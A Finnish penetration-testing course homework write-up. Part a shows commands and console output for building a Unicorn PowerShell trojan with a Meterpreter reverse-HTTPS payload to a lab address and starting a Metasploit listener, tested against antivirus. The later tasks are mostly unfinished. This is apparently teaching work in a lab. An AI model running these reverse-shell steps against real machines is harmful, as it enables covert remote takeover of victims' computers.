
Pentesting tehtävä 7

a) Tee troijalainen Unicornilla ohjeen mukaan. (Vinkki: katso Tatun raporttia)
VASTAUS:
Ajamme ohjeen mukaan komennolla itsellemme kaksi tiedostoa. Toinen siis tekstitiedosto, joten muutamme sen .bat -tiedostoksi. Tätä ei mainittu ohjeessa. Mutta tiedoksi siis.

root@kali:~/unicorn# ./unicorn.py windows/meterpreter/reverse_https 192.168.100.13 443
[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...


                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:


aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2VlcE1hdHRIYXBweS5qcGc=






	Lopputulos kun .bat -tiedostoksi muutettu tiedosto pyritään ajamaan Windows -tietokoneessa, jossa on toimiva AV-ohjelma.

(kuva puuttuu tästä)  




root@kali:~# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  tes-ti.exe  unicorn  unicorn1.txt  Videos
root@kali:~# cd unicorn
root@kali:~/unicorn# ls
CHANGELOG.txt  CREDITS.txt  LICENSE.txt  powershell_attack.txt  README.md  templates  unicorn.py  unicorn.rc
root@kali:~/unicorn# sudo msfconcole -r unicorn.rc
sudo: msfconcole: command not found
root@kali:~/unicorn# sudo msfconsole -r unicorn.rc
                                                  
                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v4.17.3-dev                          ]
+ -- --=[ 1795 exploits - 1019 auxiliary - 310 post       ]
+ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

[*] Processing unicorn.rc for ERB directives.
resource (unicorn.rc)> use multi/handler
resource (unicorn.rc)> set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
resource (unicorn.rc)> set LHOST 192.168.100.13
LHOST => 192.168.100.13
resource (unicorn.rc)> set LPORT 443
LPORT => 443
resource (unicorn.rc)> set ExitOnSession false
ExitOnSession => false
resource (unicorn.rc)> set EnableStageEncoding true
EnableStageEncoding => true
resource (unicorn.rc)> exploit -j
[*] Exploit running as background job 0.
msf exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://192.168.100.13:443



Ylläolevan viimeisen rivin jälkeen olisimme saaneet yhteyden todennettua, ellei AV-ohjelma saa tiedoston toimintaa kiinni.














b) Asenna oma, itsellesi uusi harjoitusmaali. Voit hakea maalikoneen Vulnhubista. Murtaudu koneelle, katso walktroughsta vinkki, jos jäät jumiin.
VASTAUS:
Aika loppui kesken.

c) Google Project Zero. Löydätkö tekniikoita, joita voi hyödyntää pentestissä? (Ei tarvitse toistaa haastavia assembler-temppuja)
VASTAUS:

https://googleprojectzero.blogspot.com/

Mielenkiintoisena tuli vastaan uusin blogi, jossa puhuttiin Safarin tietoturva aukosta.
Usein kuulee Mac käyttäjien puhuvan kuinka heidän koneensa ovat turvallisempia kuin Windows tietokoneet. Blogin mukaan Safari pärjäsi aiemmin heikosti testeissä. Uusinta bugia pystyi tutkimaan julkisilla työkaluilla. Onkin siis hyvä tietää mistä etsiä ja mitä työkaluja on julki saatavilla?

Vastatakseni omaan kysymykseeni.

https://github.com/googleprojectzero

Löytyy heti muutama mielenkiintoinen työkalu, joihin tutustun hieman seuraavassa.

VALITETTAVASTI AIKA LOPPUI.
